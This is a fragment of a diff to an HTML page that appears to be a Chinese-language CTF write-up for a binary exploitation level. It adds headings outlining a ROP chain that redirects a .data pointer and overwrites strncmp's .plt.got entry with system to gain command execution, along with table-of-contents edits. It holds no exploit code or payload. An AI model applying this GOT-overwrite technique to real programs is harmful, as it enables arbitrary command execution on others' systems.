+<li><code>strncmp(gRequest, token, strlen(token)</code> 时，就变成了 <code>system(gContents)</code>（虽然多的两个参数 system 根本就不会管它</li>
+</ol>
+<p>来吧，全新的 ROP Chain：</p>
+<h3 id="1-data-grequest---gcontent">1. <code>.data</code>: <code>gRequest -&gt; gContent</code></h3>
+<h3 id="2-pltgot-strncmp---system">2. <code>.plt.got</code>: <code>strncmp -&gt; system</code></h3>
+
 </section>
 
 
@@ -1563,12 +1695,26 @@ if (!doNotTrack) {
             <nav id="TableOfContents">
   <ol>
     <li><a href="#level-03">Level 03</a></li>
-    <li><a href="#overview">Overview</a></li>
-    <li><a href="#vulnerability">Vulnerability</a></li>
+    <li><a href="#overview">Overview</a>
+      <ol>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#main-purpose">Main Purpose</a></li>
+      </ol>
+    </li>
     <li><a href="#interact-with-program">Interact with Program</a></li>
     <li><a href="#find-out-rop-chain">Find Out ROP chain</a></li>
-    <li><a href="#create-rop-chain">Create ROP Chain</a></li>
+    <li><a href="#create-rop-chain">Create ROP Chain</a>
+      <ol>
+        <li><a href="#plt-got-gotplt">plt? got? got.plt??</a></li>
+      </ol>
+    </li>
     <li><a href="#end">END?</a></li>
+    <li><a href="#ignore-above-the-real-solution">Ignore Above; The REAL Solution:</a>
+      <ol>
+        <li><a href="#1-data-grequest---gcontent">1. <code>.data</code>: <code>gRequest -&gt; gContent</code></a></li>
+        <li><a href="#2-pltgot-strncmp---system">2. <code>.plt.got</code>: <code>strncmp -&gt; system</code></a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
